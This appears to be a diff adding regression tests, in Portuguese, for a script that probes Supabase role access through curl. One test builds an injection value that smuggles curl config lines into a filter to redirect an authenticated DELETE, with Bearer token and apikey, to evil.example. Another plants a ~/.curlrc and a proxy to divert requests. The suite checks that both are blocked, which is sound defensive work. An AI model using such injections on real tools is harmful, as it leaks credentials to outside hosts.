@@ -69,7 +69,7 @@ class H(http.server.BaseHTTPRequestHandler):
         return cfg.TOKENS.get(tok, "?")
     def _registra(self):
         with open(LOG, "a") as f:
-            f.write("%s %s apikey=%s papel=%s\n" % (self.command, self.path, "sim" if self.headers.get("apikey") in cfg.TOKENS else "nao", self._papel()))
+            f.write("%s %s host=%s apikey=%s papel=%s\n" % (self.command, self.path, self.headers.get("Host"), "sim" if self.headers.get("apikey") in cfg.TOKENS else "nao", self._papel()))
     def _responde(self, codigo, faixa=None, corpo=b""):
         self.send_response(codigo)
         if faixa is not None: self.send_header("Content-Range", faixa)
@@ -112,7 +112,7 @@ roda() { # roda <url> [args...] — ambiente só com o que o script deve ler
   local u="$1"; shift
   # EXTRA_ENV é uma lista VAR=valor, quebrada por espaço de propósito.
   # shellcheck disable=SC2086
-  env -i PATH="${PATH_TESTE:-$PATH}" HOME="$TMP" TMPDIR="$TMP" \
+  env -i PATH="${PATH_TESTE:-$PATH}" HOME="${HOME_TESTE:-$TMP}" TMPDIR="$TMP" \
     SUPABASE_URL="$u" SUPABASE_ANON_KEY="$ANON" MATRIZ_JWT_A="$JA" MATRIZ_JWT_B="$JB" MATRIZ_JWT_ADMIN="$JADM" \
     ${EXTRA_ENV:-} bash "$SCRIPT" "$@" 2>&1
 }
@@ -245,6 +245,47 @@ echo "== 9. --help mostra o cabeçalho, não código =="
 saida="$(bash "$SCRIPT" --help 2>&1)"
 tem "MATRIZ_JWT_A" "$saida" "--help documenta as variáveis"
 nao_tem "set -uo pipefail" "$saida" "--help não imprime código"
+
+echo "== 10. MATRIZ_FILTRO não injeta opção no config do curl =="
+# Payload do revisor: fecha a aspa do url, cria um resolve para um host de fora apontando para
+# o mock e troca o url. Antes, saía DELETE com Bearer e apikey para evil.example.
+INJ="$(printf 'id=eq.1"\nresolve = "evil.example:%s:127.0.0.1"\nurl = "http://evil.example:%s/pwn' "$PORTA" "$PORTA")"
+: > "$TMP/reqs.log"
+saida="$(EXTRA_ENV="" MATRIZ_FILTRO="$INJ" env -i PATH="$PATH" HOME="$TMP" TMPDIR="$TMP" SUPABASE_URL="$URL" SUPABASE_ANON_KEY="$ANON" \
+  MATRIZ_JWT_A="$JA" MATRIZ_FILTRO="$INJ" MATRIZ_CORPO_UPDATE='{"x":2}' bash "$SCRIPT" --escrita pedidos 2>&1)"; rc=$?
+[ "$rc" -eq 2 ] && ok "filtro com aspa e quebra de linha é recusado (exit 2)" || falha "filtro injetado: exit esperado 2, veio $rc"
+[ ! -s "$TMP/reqs.log" ] && ok "nenhuma requisição chegou ao mock com o filtro injetado" || falha "requisição saiu com filtro injetado: $(cat "$TMP/reqs.log")"
+nao_tem "evil.example" "$(cat "$TMP/reqs.log")" "nenhuma requisição com Host evil.example"
+sem_token "$saida" "filtro injetado"
+for ruim in 'id=eq.1\x' "$(printf 'id=eq.1\tx')" 'id=eq."1"'; do
+  : > "$TMP/reqs.log"
+  saida="$(env -i PATH="$PATH" HOME="$TMP" TMPDIR="$TMP" SUPABASE_URL="$URL" SUPABASE_ANON_KEY="$ANON" MATRIZ_FILTRO="$ruim" bash "$SCRIPT" --escrita pedidos 2>&1)"; rc=$?
+  [ "$rc" -eq 2 ] && [ ! -s "$TMP/reqs.log" ] && ok "filtro com aspa, barra ou controle recusado sem requisição" || falha "filtro ruim passou (exit $rc)"
+done
+
+echo "== 11. ~/.curlrc e proxy do ambiente não desviam a medição =="
+# A URL aponta para uma porta fechada; o desvio levaria ao mock e daria contagem falsa.
+# Separados: connect-to e proxy juntos se anulam no curl e esconderiam o problema.
+mkdir -p "$TMP/home-rc" "$TMP/home-limpo"
+printf 'location\nconnect-to = "::127.0.0.1:%s"\n' "$PORTA" > "$TMP/home-rc/.curlrc"
+for desvio in curlrc proxy; do
+  : > "$TMP/reqs.log"
+  if [ "$desvio" = curlrc ]; then
+    saida="$(HOME_TESTE="$TMP/home-rc" roda "http://127.0.0.1:$FECHADA" pedidos)"; rc=$?
+  else
+    saida="$(HOME_TESTE="$TMP/home-limpo" EXTRA_ENV="http_proxy=http://127.0.0.1:$PORTA" roda "http://127.0.0.1:$FECHADA" pedidos)"; rc=$?
+  fi
+  [ ! -s "$TMP/reqs.log" ] && ok "$desvio: nada desviado para o mock" || falha "$desvio: requisição desviada ($(head -1 "$TMP/reqs.log"))"
+  tem "op=SELECT papel=A tabela=pedidos resultado=nao_medido" "$saida" "$desvio: porta fechada continua não medida"
+  nao_tem "resultado=3" "$saida" "$desvio: nenhum sucesso falso"
+  [ "$rc" -eq 3 ] && ok "$desvio: exit 3" || falha "$desvio: exit esperado 3, veio $rc"
+done
+
+echo "== 12. flag desconhecida não ecoa o argumento =="
+saida="$(roda "$URL" "--$JA" pedidos)"; rc=$?
+[ "$rc" -eq 2 ] && ok "flag desconhecida sai 2" || falha "flag desconhecida: exit $rc"
+sem_token "$saida" "flag desconhecida com token"
+tem "posição 1" "$saida" "a mensagem diz a posição, não o valor"
 
 echo
 if [ "$falhas" -eq 0 ]; then echo "PASSOU"; exit 0; fi
